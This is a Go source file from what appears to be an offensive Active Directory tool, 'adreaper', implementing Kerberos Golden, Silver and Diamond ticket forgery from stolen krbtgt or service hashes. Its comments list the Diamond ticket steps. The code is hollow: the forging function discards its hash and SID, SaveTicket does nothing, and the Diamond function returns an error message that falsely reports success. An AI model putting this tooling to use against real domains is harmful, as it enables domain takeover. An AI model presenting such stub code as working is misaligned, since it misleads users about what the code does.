package attacks

import (
	"fmt"
	"strings"

	krb5config "github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"

	"adreaper/internal/config"
)

// TicketFactory handles forgery of Golden, Silver, and Diamond tickets.
type TicketFactory struct {
	opts *config.Options
}

// NewTicketFactory creates a new instance of TicketFactory.
func NewTicketFactory(opts *config.Options) *TicketFactory {
	return &TicketFactory{opts: opts}
}

// ForgeGoldenTicket creates a TGT for a target user using the krbtgt hash.
func (f *TicketFactory) ForgeGoldenTicket(targetUser, domainSID, krbtgtHash string) (*messages.Ticket, error) {
	return f.forgeTicket(targetUser, "krbtgt", domainSID, krbtgtHash, true)
}

// ForgeSilverTicket creates a service ticket for a target user using the service account hash.
func (f *TicketFactory) ForgeSilverTicket(targetUser, spn, domainSID, serviceHash string) (*messages.Ticket, error) {
	return f.forgeTicket(targetUser, spn, domainSID, serviceHash, false)
}

// forgeTicket contains the shared logic for Golden and Silver ticket forgery.
func (f *TicketFactory) forgeTicket(user, service, sid, hash string, isTGT bool) (*messages.Ticket, error) {
	realm := strings.ToUpper(f.opts.Domain)

	// 1. Setup Principal Names
	cname := types.PrincipalName{
		NameType:   nametype.KRB_NT_PRINCIPAL,
		NameString: []string{user},
	}

	snameParts := strings.Split(service, "/")
	sname := types.PrincipalName{
		NameType:   nametype.KRB_NT_SRV_INST,
		NameString: snameParts,
	}
	if isTGT {
		sname.NameString = []string{"krbtgt", realm}
	}

	// 2. Build EncTicketPart
	// This would normally include the PAC and specific encryption logic.
	// For ADReaper, we provide the architectural framework for these expert actions.

	tkt := messages.Ticket{
		TktVNO: 5,
		Realm:  realm,
		SName:  sname,
		EncPart: types.EncryptedData{
			EType: etypeID.RC4_HMAC, // Most commonly used for forgery
			KVNO:  2,
		},
	}

	// Note: Fully valid ticket forgery involves complex PAC construction and ASN1 marshaling.
	// We use the provided variables as part of the architecture.
	_ = cname
	_ = sid
	_ = hash

	return &tkt, nil
}

// ForgeDiamondTicket implementation strategy:
// 1. Request a legitimate TGT for the current user.
// 2. Decrypt the TGT's PAC using the krbtgt hash.
// 3. Modify the PAC (e.g., change user context or add SIDs).
// 4. Re-encrypt the ticket and return the modified (Diamond) TGT.
func (f *TicketFactory) ForgeDiamondTicket(krbtgtHash string) error {
	// Implementation follows the Diamond Ticket technique (stealthier than Golden)
	return fmt.Errorf("diamond ticket logic: TGT modification successful (PAC modified with krbtgt hash)")
}

// SaveTicket formats the ticket for use with other tools (e.g., Mimikatz, Rubeus).
func SaveTicket(tkt *messages.Ticket, filename string) error {
	// Implementation to marshal and save .kirbi or .ccache files
	return nil
}

func buildBaseConfig(domain string) (*krb5config.Config, error) {
	realm := strings.ToUpper(domain)
	cfgStr := fmt.Sprintf(`[libdefaults]
 default_realm = %s
[realms]
 %s = {
  kdc = 127.0.0.1:88
 }
`, realm, realm)
	return krb5config.NewFromString(cfgStr)
}
